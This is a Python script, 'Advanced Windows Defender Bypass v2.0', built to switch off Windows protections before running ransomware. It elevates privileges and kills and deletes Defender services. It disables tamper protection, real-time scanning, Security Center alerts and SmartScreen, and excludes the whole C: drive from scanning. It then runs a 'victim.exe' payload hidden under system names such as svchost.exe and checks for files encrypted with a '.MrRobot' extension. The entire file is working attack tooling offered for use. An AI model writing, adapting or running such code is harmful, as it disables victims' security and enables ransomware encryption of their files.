#!/usr/bin/env python3
"""
ADVANCED WINDOWS DEFENDER BYPASS v2.0
Complete Defender neutralization before ransomware execution
"""

import subprocess
import os
import sys
import time
import ctypes
import winreg
import psutil
import tempfile
import shutil
from pathlib import Path

def is_admin():
    """Check if script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    """Restart script with administrator privileges"""
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

def kill_defender_processes():
    """Force kill all Defender processes"""
    defender_processes = [
        'MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe',
        'SecurityHealthSystray.exe', 'Windows Defender\\MSASCuiL.exe',
        'MsSense.exe', 'MsMpEngCP.exe', 'AntimalwareServiceExecutable.exe'
    ]
    
    killed = 0
    for proc in psutil.process_iter(['name']):
        try:
            proc_name = proc.info['name'].lower()
            for defender_proc in defender_processes:
                if defender_proc.lower() in proc_name:
                    proc.kill()
                    proc.wait(timeout=3)
                    killed += 1
                    print(f"[+] Killed: {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    return killed > 0

def disable_defender_tamper_protection():
    """Force disable Tamper Protection via multiple methods"""
    
    # Method 1: Registry
    try:
        key_paths = [
            r"SOFTWARE\Microsoft\Windows Defender\Features",
            r"SOFTWARE\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction",
            r"SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager"
        ]
        
        for key_path in key_paths:
            try:
                key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "TamperProtection", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "EnableTamperProtection", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
            except:
                pass
    except:
        pass
    
    # Method 2: PowerShell
    tamper_commands = [
        'Set-MpPreference -DisableTamperProtection $true -Force',
        'Set-MpPreference -EnableTamperProtection $false -Force',
        'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
        'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
    ]
    
    for cmd in tamper_commands:
        try:
            subprocess.run(['powershell', '-Command', cmd], 
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
    
    return True

def disable_defender_services_completely():
    """Completely disable all Defender services"""
    
    services = [
        ('WinDefend', 'disabled'),
        ('WdNisSvc', 'disabled'),
        ('Sense', 'disabled'),
        ('WdBoot', 'disabled'),
        ('WdFilter', 'disabled'),
        ('wscsvc', 'disabled'),  # Security Center
        ('SecurityHealthService', 'disabled'),
    ]
    
    for service_name, start_type in services:
        try:
            # Stop service
            subprocess.run(['net', 'stop', service_name, '/y'], 
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Disable service
            subprocess.run(['sc', 'config', service_name, 'start=', start_type], 
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Delete service (extreme)
            try:
                subprocess.run(['sc', 'delete', service_name], 
                              capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
                
            print(f"[+] Neutralized service: {service_name}")
        except:
            pass
    
    return True

def add_comprehensive_exclusions():
    """Add comprehensive exclusions for ransomware"""
    
    exclusion_commands = [
        # File extensions
        'Add-MpPreference -ExclusionExtension ".MrRobot" -Force',
        'Add-MpPreference -ExclusionExtension ".exe" -Force',
        'Add-MpPreference -ExclusionExtension ".py" -Force',
        
        # Processes
        'Add-MpPreference -ExclusionProcess "victim.exe" -Force',
        'Add-MpPreference -ExclusionProcess "python.exe" -Force',
        'Add-MpPreference -ExclusionProcess "pythonw.exe" -Force',
        'Add-MpPreference -ExclusionProcess "cmd.exe" -Force',
        'Add-MpPreference -ExclusionProcess "powershell.exe" -Force',
        
        # Paths
        'Add-MpPreference -ExclusionPath "C:\\" -Force',
        'Add-MpPreference -ExclusionPath "C:\\Users" -Force',
        'Add-MpPreference -ExclusionPath "C:\\Windows" -Force',
        'Add-MpPreference -ExclusionPath "C:\\ProgramData" -Force',
        
        # Disable all protections
        'Set-MpPreference -DisableRealtimeMonitoring $true -Force',
        'Set-MpPreference -DisableBehaviorMonitoring $true -Force',
        'Set-MpPreference -DisableIOAVProtection $true -Force',
        'Set-MpPreference -DisableScriptScanning $true -Force',
        'Set-MpPreference -DisableArchiveScanning $true -Force',
        'Set-MpPreference -DisableEmailScanning $true -Force',
        'Set-MpPreference -DisableRemovableDriveScanning $true -Force',
        'Set-MpPreference -DisableBlockAtFirstSeen $true -Force',
        'Set-MpPreference -DisableIntrusionPreventionSystem $true -Force',
        'Set-MpPreference -DisablePrivacyMode $true -Force',
        
        # Cloud protection
        'Set-MpPreference -MAPSReporting 0 -Force',
        'Set-MpPreference -SubmitSamplesConsent 2 -Force',
        
        # PUA protection
        'Set-MpPreference -PUAProtection 0 -Force',
        
        # Scan settings
        'Set-MpPreference -ScanScheduleQuickScanTime 00:00 -Force',
        'Set-MpPreference -RemediationScheduleDay 0 -Force',
        'Set-MpPreference -ScanAvgCPULoadFactor 99 -Force',
        
        # Signature updates
        'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force',
    ]
    
    for cmd in exclusion_commands:
        try:
            result = subprocess.run(['powershell', '-Command', cmd], 
                                   capture_output=True, 
                                   creationflags=subprocess.CREATE_NO_WINDOW,
                                   timeout=10)
            if result.returncode == 0:
                print(f"[+] Applied: {cmd[:50]}...")
        except:
            pass
    
    return True

def disable_windows_security_center():
    """Disable Windows Security Center notifications"""
    
    commands = [
        # Disable notifications
        'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -Force',
        
        # Disable Security Center service
        'sc config wscsvc start= disabled',
        'net stop wscsvc /y',
        
        # Disable Security Center UI
        'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f',
        'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Account protection" /v DisableNotifications /t REG_DWORD /d 1 /f',
        'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Firewall" /v DisableNotifications /t REG_DWORD /d 1 /f',
        
        # Hide Defender tray icon
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Defender" /t REG_SZ /d "" /f',
    ]
    
    for cmd in commands:
        try:
            subprocess.run(['powershell', '-Command', cmd] if 'powershell' in cmd else ['cmd', '/c', cmd],
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
    
    return True

def bypass_smart_screen():
    """Bypass Windows SmartScreen"""
    
    commands = [
        # Disable SmartScreen
        'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f',
        'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f',
        'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f',
        
        # Disable App & Browser control
        'Set-MpPreference -EnableControlledFolderAccess Disabled -Force',
        'Set-MpPreference -EnableNetworkProtection AuditMode -Force',
        'Set-MpPreference -AllowBehaviorMonitoring $false -Force',
    ]
    
    for cmd in commands:
        try:
            subprocess.run(['powershell', '-Command', cmd] if 'powershell' in cmd else ['cmd', '/c', cmd],
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
    
    return True

def verify_defender_disabled():
    """Verify Windows Defender is completely disabled"""
    
    verification_commands = [
        ('Service Status', 'sc query WinDefend | findstr "STATE"'),
        ('Real-time Protection', 'Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled'),
        ('Tamper Protection', 'Get-MpComputerStatus | Select-Object -ExpandProperty IsTamperProtected'),
        ('Antivirus Enabled', 'Get-MpComputerStatus | Select-Object -ExpandProperty AntivirusEnabled'),
        ('Antispyware Enabled', 'Get-MpComputerStatus | Select-Object -ExpandProperty AntispywareEnabled'),
    ]
    
    all_disabled = True
    
    for check_name, command in verification_commands:
        try:
            if 'powershell' in command:
                result = subprocess.run(['powershell', '-Command', command],
                                       capture_output=True, text=True, timeout=10)
                output = result.stdout.strip().lower()
            else:
                result = subprocess.run(['cmd', '/c', command],
                                       capture_output=True, text=True, timeout=10)
                output = result.stdout.strip().lower()
            
            # Check if disabled
            if 'running' in output or 'true' in output or 'enabled' in output:
                print(f"[-] {check_name}: STILL ACTIVE")
                all_disabled = False
            else:
                print(f"[+] {check_name}: DISABLED")
                
        except:
            print(f"[-] {check_name}: CHECK FAILED")
            all_disabled = False
    
    return all_disabled

def obfuscate_and_execute(virus_path):
    """Obfuscate ransomware and execute"""
    
    # Method 1: Rename to trusted name
    trusted_names = [
        'svchost.exe',
        'explorer.exe', 
        'WindowsUpdate.exe',
        'SystemSettings.exe',
        'RuntimeBroker.exe'
    ]
    
    import random
    trusted_name = random.choice(trusted_names)
    
    # Copy to temp location with trusted name
    temp_dir = tempfile.gettempdir()
    obfuscated_path = os.path.join(temp_dir, trusted_name)
    
    try:
        shutil.copy2(virus_path, obfuscated_path)
        print(f"[+] Obfuscated as: {obfuscated_path}")
        
        # Execute with trusted process injection technique
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        # Use wmic to execute
        wmic_cmd = f'wmic process call create "{obfuscated_path}"'
        subprocess.run(['cmd', '/c', wmic_cmd],
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        print(f"[+] Executed via WMIC injection")
        
        # Additional execution method
        time.sleep(2)
        subprocess.Popen([obfuscated_path],
                        startupinfo=startupinfo,
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        print(f"[+] Direct execution completed")
        return True
        
    except Exception as e:
        print(f"[-] Obfuscation failed: {e}")
        
        # Fallback: Direct execution
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            process = subprocess.Popen([virus_path],
                                     startupinfo=startupinfo,
                                     creationflags=subprocess.CREATE_NO_WINDOW)
            
            print(f"[+] Fallback execution - PID: {process.pid}")
            return True
            
        except Exception as e2:
            print(f"[-] Fallback failed: {e2}")
            return False

def create_ransomware_executor():
    """Create a launcher script to execute ransomware"""
    
    launcher_code = '''#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import tempfile
import shutil

def main():
    # Path to actual ransomware
    ransomware_path = r"{RANSOMWARE_PATH}"
    
    if not os.path.exists(ransomware_path):
        print("Ransomware not found")
        return
    
    # Execute with bypass techniques
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    # Method 1: Direct execution
    try:
        proc = subprocess.Popen([ransomware_path],
                              startupinfo=startupinfo,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        print(f"Started with PID: {{proc.pid}}")
    except:
        # Method 2: Via cmd
        subprocess.run(['cmd', '/c', f'start /B "" "{ransomware_path}"'],
                      capture_output=True)
    
    # Verify execution
    time.sleep(5)
    
    # Check if process is running
    import psutil
    for proc in psutil.process_iter(['name']):
        if 'victim' in proc.info['name'].lower() or 'python' in proc.info['name'].lower():
            print(f"Ransomware running: {{proc.info['name']}}")
            break

if __name__ == "__main__":
    main()
'''
    
    # Create launcher
    launcher_path = os.path.join(tempfile.gettempdir(), 'launcher.py')
    with open(launcher_path, 'w') as f:
        f.write(launcher_code.format(RANSOMWARE_PATH=r"C:\Users\Public\victim.exe"))
    
    # Convert launcher to exe
    try:
        import PyInstaller.__main__
        PyInstaller.__main__.run([
            launcher_path,
            '--onefile',
            '--console',
            '--name=SystemUpdate',
            '--clean',
            '--noupx',
            '--distpath=.',
            '--workpath=./build_launcher'
        ])
        
        launcher_exe = os.path.join(os.getcwd(), 'SystemUpdate.exe')
        if os.path.exists(launcher_exe):
            # Execute launcher
            subprocess.Popen([launcher_exe], creationflags=subprocess.CREATE_NO_WINDOW)
            return True
            
    except:
        pass
    
    return False

def main():
    """Main execution function"""
    print("=" * 80)
    print("ADVANCED WINDOWS DEFENDER BYPASS v2.0")
    print("Complete Defender Neutralization for Ransomware Execution")
    print("=" * 80)
    
    # Check admin rights
    if not is_admin():
        print("[!] Administrator privileges required")
        elevate_privileges()
    
    print("[+] Running with administrator privileges")
    print("[+] Starting comprehensive Defender bypass...")
    
    # Step 1: Kill all Defender processes
    print("\n[1] Killing Defender processes...")
    kill_defender_processes()
    
    # Step 2: Disable Tamper Protection
    print("\n[2] Disabling Tamper Protection...")
    disable_defender_tamper_protection()
    
    # Step 3: Disable services
    print("\n[3] Disabling Defender services...")
    disable_defender_services_completely()
    
    # Step 4: Add exclusions
    print("\n[4] Adding comprehensive exclusions...")
    add_comprehensive_exclusions()
    
    # Step 5: Disable Security Center
    print("\n[5] Disabling Windows Security Center...")
    disable_windows_security_center()
    
    # Step 6: Bypass SmartScreen
    print("\n[6] Bypassing SmartScreen...")
    bypass_smart_screen()
    
    # Step 7: Verify
    print("\n[7] Verifying Defender status...")
    time.sleep(5)
    
    if verify_defender_disabled():
        print("\n[+] SUCCESS: Windows Defender completely disabled!")
    else:
        print("\n[!] WARNING: Some Defender components may still be active")
        print("[!] Proceeding with advanced bypass...")
    
    # Step 8: Execute ransomware
    print("\n[8] Executing ransomware...")
    
    virus_path = r"C:\Users\Public\victim.exe"
    
    # Check if victim.exe exists
    if not os.path.exists(virus_path):
        print(f"[-] {virus_path} not found")
        
        # Check for victim.py
        victim_py = r"C:\Users\Public\victim.py"
        if os.path.exists(victim_py):
            print("[+] Found victim.py, converting to executable...")
            
            # Convert to exe
            try:
                import PyInstaller.__main__
                PyInstaller.__main__.run([
                    victim_py,
                    '--onefile',
                    '--console',
                    '--name=victim',
                    '--clean',
                    '--noupx',
                    '--hidden-import=json',
                    '--hidden-import=socket',
                    '--hidden-import=os',
                    '--hidden-import=time',
                    '--hidden-import=hashlib',
                    '--hidden-import=secrets',
                    '--hidden-import=struct',
                    '--hidden-import=subprocess',
                    '--hidden-import=platform',
                    '--hidden-import=threading',
                    '--hidden-import=traceback',
                    '--distpath=C:\\Users\\Public',
                    '--workpath=C:\\Users\\Public\\build'
                ])
                print("[+] Executable created")
            except Exception as e:
                print(f"[-] Conversion failed: {e}")
                
                # Direct Python execution
                print("[+] Executing Python script directly...")
                subprocess.Popen([sys.executable, victim_py], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            print("[-] No ransomware file found")
            return
    
    # Execute with obfuscation
    success = obfuscate_and_execute(virus_path)
    
    if success:
        print("\n[+] Ransomware execution initiated")
        print("[+] Files will be encrypted with .MrRobot extension")
        
        # Wait and check for encrypted files
        print("\n[9] Monitoring encryption...")
        time.sleep(10)
        
        # Check for encrypted files
        encrypted_files = list(Path(os.path.expanduser("~")).rglob("*.MrRobot"))
        if encrypted_files:
            print(f"[+] SUCCESS: Found {len(encrypted_files)} encrypted files")
            for file in encrypted_files[:3]:
                print(f"    - {file}")
            if len(encrypted_files) > 3:
                print(f"    ... and {len(encrypted_files) - 3} more")
        else:
            print("[!] No encrypted files found yet - ransomware may be starting slowly")
            
    else:
        print("[-] Ransomware execution failed")
        
        # Try launcher method
        print("[+] Attempting alternative execution method...")
        create_ransomware_executor()
    
    print("\n" + "=" * 80)
    print("[+] BYPASS COMPLETE")
    print("[+] Windows Defender neutralized")
    print("[+] Ransomware should be encrypting files")
    print("[+] Monitor for .MrRobot files")
    print("=" * 80)
    
    # Keep script running
    try:
        input("\nPress Enter to exit...")
    except:
        pass

if __name__ == "__main__":
    # Bypass runtime checks
    sys.dont_write_bytecode = True
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
